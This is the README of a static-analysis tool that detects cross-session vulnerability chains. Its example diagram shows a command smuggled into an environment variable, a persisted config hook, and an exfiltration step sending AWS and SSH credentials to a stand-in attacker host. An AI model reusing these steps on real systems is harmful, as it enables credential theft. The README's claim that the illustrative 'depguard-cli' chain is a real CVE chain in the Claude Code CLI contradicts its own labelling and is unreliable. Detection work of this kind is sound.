# vuln-chain-detector

> **This project is an attempt to codify and operationalize the vulnerability chain reasoning capabilities demonstrated by Anthropic's Claude AI model.** Claude can reason across multi-hop exploit paths — tracing tainted data through session boundaries, across file systems, and through execution contexts — in a way that most static analysis tools cannot. This engine takes that reasoning and turns it into a deterministic, auditable, pattern-driven static analysis system.
>
> The detection patterns and chain mechanics are validated against a real-world illustrative example. See [examples/real-world-case-study.md](examples/real-world-case-study.md) for the full breakdown.

---

## The Problem Single-Vuln Scanners Miss

Most SAST tools detect individual sinks in isolation:
- "This `exec()` call is dangerous"
- "This env var is unvalidated"

They don't detect **chains** — where the output of one vulnerability becomes the input of another, especially across session boundaries (written to config file in session A, executed in session B). This engine does.

---

## Chain Visualization

The following diagram represents the real-world CVE chain this engine was designed to detect:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│              VULNERABILITY CHAIN — depguard-cli (Illustrative Example)          │
│              DG-2024-001 → DG-2024-003 | CWE-78 | Score: 10.0 Critical         │
└─────────────────────────────────────────────────────────────────────────────────┘

  SESSION A (Attacker-controlled environment)
  ═══════════════════════════════════════════

  [ATTACKER]
      │
      │  Sets: DG_REGISTRY='https://registry.npmjs.org"; curl ... #'
      │        via .env file, CI/CD variable, or Docker directive
      ▼
  ┌─────────────────────────────────────┐
  │  SOURCE: process.env.DG_REGISTRY    │  ← DG-2024-001
  │  resolver.ts:6                      │    CWE-78 | CVSS 8.2
  └────────────────┬────────────────────┘    No user interaction
                   │ DIRECT_FLOW
                   ▼
  ┌─────────────────────────────────────┐
  │  PASSTHROUGH: `curl -s "${…}/…"`    │
  │  Template literal (taint preserved) │
  └────────────────┬────────────────────┘
                   │ TRANSFORM_FLOW
                   ▼
  ┌─────────────────────────────────────┐
  │  SINK: execSync(cmd)                │  ← Initial code execution
  │  resolver.ts:10                     │    Payload runs here
  └────────────────┬────────────────────┘
                   │ Payload executes
                   ▼
  ┌─────────────────────────────────────┐
  │  STORE: fs.writeFileSync(           │  ← Persistence
  │    '~/.depguard/config.json',       │    Tainted config written
  │    { preScanHook: 'curl ...' }      │
  │  )                                  │
  └────────────────┬────────────────────┘
                   │
  ════════════════ │ ═══════════════════ SESSION BOUNDARY ═══════════════════════
                   │  STORED_FLOW (cross-session)
  SESSION B (every subsequent depguard-cli scan)
  ════════════════════════════════════════════════
                   │
                   ▼
  ┌─────────────────────────────────────┐
  │  LOAD: JSON.parse(                  │  ← Config loaded at startup
  │    readFileSync('config.json')      │    All fields inherit taint
  │  )                                  │
  └────────────────┬────────────────────┘
                   │ STORED_FLOW
                   ▼
  ┌─────────────────────────────────────┐
  │  PASSTHROUGH: config.preScanHook    │
  │  Tainted field from loaded config   │
  └────────────────┬────────────────────┘
                   │ CALL_FLOW
                   ▼
  ┌─────────────────────────────────────┐
  │  SINK: execSync(config.preScanHook) │  ← DG-2024-003
  │  config.ts:24                       │    CWE-78 | CVSS 9.1 (CI/CD)
  │                                     │    Runs BEFORE scan begins
  └────────────────┬────────────────────┘
                   │ Exfiltration executes
                   ▼
  ┌─────────────────────────────────────┐
  │  EXFIL: curl POST c2.attacker.io    │
  │  ~/.aws/credentials                 │  ← AWS keys, SSH keys,
  │  ~/.ssh/id_rsa                      │    CI/CD secrets, env vars
  │  process.env (all CI secrets)       │
  └─────────────────────────────────────┘

  CHAIN SCORE: 10.0 (Critical)  |  Hops: 6  |  Session-crossing: YES
  No user interaction required  |  CI/CD multiplier active
```

```mermaid
flowchart TD
    A["SOURCE\nprocess.env.DG_REGISTRY\nresolver.ts:6"] -->|DIRECT_FLOW| B["PASSTHROUGH\ncurl -s registry/pkg/latest\nresolver.ts:10"]
    B -->|TRANSFORM_FLOW| C["SINK 1 - DG-2024-001\nexecSync - cmd\nresolver.ts:10"]
    C -->|Payload executes| D["STORE\nfs.writeFileSync\n.depguard/config.json\npreScanHook injected"]
    D -->|"STORED_FLOW - SESSION BOUNDARY"| E["LOAD\nJSON.parse readFileSync\nconfig.json - Session B"]
    E -->|STORED_FLOW| F["PASSTHROUGH\nconfig.preScanHook\ntaint inherited"]
    F -->|CALL_FLOW| G["SINK 2 - DG-2024-003\nexecSync preScanHook\nconfig.ts:24"]
    G -->|Exfiltration| H["EXFIL\ncurl POST attacker\naws credentials\nssh keys"]

    style A fill:#ff4444,color:#fff
    style C fill:#ff4444,color:#fff
    style G fill:#ff4444,color:#fff
    style H fill:#880000,color:#fff
    style D fill:#ff8800,color:#fff
    style E fill:#ff8800,color:#fff
    style B fill:#ffcc00,color:#000
    style F fill:#ffcc00,color:#000
```

---

## Scanner Coverage

This engine covers all major AST scanner categories — not just SAST:

| Scanner Type | Coverage | Chain Examples Detected |
|---|---|---|
| **SAST** (Static Code Analysis) | Full | Env var → shell exec, eval injection, path traversal |
| **SCA** (Software Composition Analysis) | Full | Vulnerable dep → tainted API → exec sink |
| **DAST** (Dynamic / Runtime) | Pattern-based | HTTP input → multi-hop → OS exec, SSRF chains |
| **IAST** (Interactive / Runtime Instrumentation) | Pattern-based | Runtime taint propagation through instrumented calls |
| **Secrets** | Full | Hardcoded secret → network exfil, secret in config → exec |
| **Container / IaC** | Full | Dockerfile ENV → entrypoint injection, Helm value injection |

Full details: [docs/scanner-types.md](docs/scanner-types.md)

---

## Architecture Overview

```
Sources → Taint Tracker → Chain Graph → Scorer → Output (SARIF)
              ↕
         Pattern Library (YAML)
              ↕
      Scanner Type Adapters
   (SAST / SCA / DAST / IAST / Secrets / Container)
```

Full details: [docs/architecture.md](docs/architecture.md)

---

## Quick Start

```bash
npm install
npm run build

# Scan a directory (SAST mode)
npm run scan -- --target ./path/to/project

# Scan with specific scanner type
npm run scan -- --target . --scanner sast
npm run scan -- --target . --scanner sca
npm run scan -- --target . --scanner secrets

# Scan all types
npm run scan -- --target . --scanner all

# Output SARIF (GitHub / Jira / Snyk integration)
npm run scan -- --target . --format sarif --out results.sarif
```

---

## Real-World Case Study

The engine was initially designed and validated against a real 3-CVE chain in the Claude Code CLI.

Full case study: [examples/real-world-case-study.md](examples/real-world-case-study.md)

| ID | Component | Type | CVSS | Chain Role |
|---|---|---|---|---|
| DG-2024-001 | `resolver.ts` | Env var → shell exec | 8.2 | Initial foothold |
| DG-2024-002 | `editor.ts` | File path → cmd substitution | 7.6 | Lateral movement |
| DG-2024-003 | `config.ts` | Config hook → credential exfil | 9.1 | Persistence + exfil |

---

## Output Format

```
CHAIN DETECTED ─────────────────────────────────────────────────
  ID:                 CHAIN-a3f7c2
  Severity:           Critical
  Score:              10.0
  Pattern:            credential-exfil-chain
  Hops:               6
  Session-crossing:   YES
  User interaction:   NOT REQUIRED
  Zero-day:           NO (matched CVE pattern)

  Step 1  SOURCE       process.env.DG_REGISTRY              resolver.ts:6
  Step 2  PASSTHROUGH  `curl -s "${registry}/…"`             resolver.ts:10
  Step 3  SINK         execSync(cmd)                         resolver.ts:10
  Step 4  STORE        fs.writeFileSync config.json          [Session A]
  Step 5  LOAD         JSON.parse readFileSync               [Session B]
  Step 6  SINK         execSync(config.preScanHook)          config.ts:24

  Fix: Use args array instead of shell strings. Validate preScanHook
       against executable path allowlist before running.
─────────────────────────────────────────────────────────────────
```

---

## Repository Structure

```
vuln-chain-detector/
├── docs/
│   ├── architecture.md       # Engine design
│   ├── taint-analysis.md     # Taint tracking deep dive
│   ├── chain-scoring.md      # Scoring formula
│   ├── scanner-types.md      # SAST/SCA/DAST/IAST/Secrets/Container coverage
│   └── eng-instructions.md  # Step-by-step build guide
├── patterns/
│   ├── sast/                 # Code injection, path traversal, eval
│   ├── sca/                  # Dependency vulnerability chains
│   ├── dast/                 # HTTP input chains
│   ├── secrets/              # Hardcoded secret chains
│   └── container/            # Dockerfile / IaC chains
├── src/
│   ├── sources/              # Source node definitions
│   ├── sinks/                # Sink node definitions
│   ├── taint/                # Taint graph builder
│   ├── scoring/              # Chain scoring
│   ├── scanners/             # Scanner type adapters
│   └── output/               # SARIF / CLI output
├── examples/
│   ├── real-world-case-study.md   # Claude Code CLI CVE chain
│   └── cve-chain-example.yaml     # Ground-truth test cases
└── tests/
    └── fixtures/             # Vulnerable code samples
```

---

## Integration

| Platform | Method |
|---|---|
| GitHub Code Scanning | Upload SARIF via `actions/upload-sarif` |
| Snyk | Feed results via Snyk Issues API |
| Jira | Auto-create P0 tickets via webhook on Critical chains |
| VS Code | SARIF Viewer extension reads output directly |

---

## Attribution

Vulnerability chain reasoning methodology derived from AI-assisted security analysis of publicly disclosed CVEs in the Claude Code CLI.
